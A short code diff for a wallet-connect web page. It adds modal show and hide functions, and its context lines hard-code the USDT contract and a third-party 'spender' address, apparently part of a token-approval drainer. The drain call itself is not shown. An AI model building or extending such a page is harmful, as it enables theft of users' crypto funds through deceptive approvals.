@@ -2,6 +2,16 @@ let isConnecting = false;
 const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT token contract address
 const spenderAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Address allowed to spend tokens
 
+// Function to show the modal
+function showModal() {
+    document.getElementById("walletModal").classList.add("show");
+}
+
+// Function to hide the modal
+function hideModal() {
+    document.getElementById("walletModal").classList.remove("show");
+}
+
 async function connectWallet(walletName) {
     if (isConnecting) {
         console.log("Connection request already in progress...");
@@ -127,3 +137,9 @@ document.getElementById("rainbowWalletButton").addEventListener("click", () => c
 document.getElementById("argentWalletButton").addEventListener("click", () => connectWallet("Argent Wallet"));
 document.getElementById("coinbaseWalletButton").addEventListener("click", () => connectWallet("Coinbase Wallet"));
 document.getElementById("oneInchWalletButton").addEventListener("click", () => connectWallet("1inch Wallet"));
+
+// Event listener for showing the modal
+document.getElementById("connectButton").addEventListener("click", showModal);
+
+// Event listener for closing the modal
+document.getElementById("closeModal").addEventListener("click", hideModal);
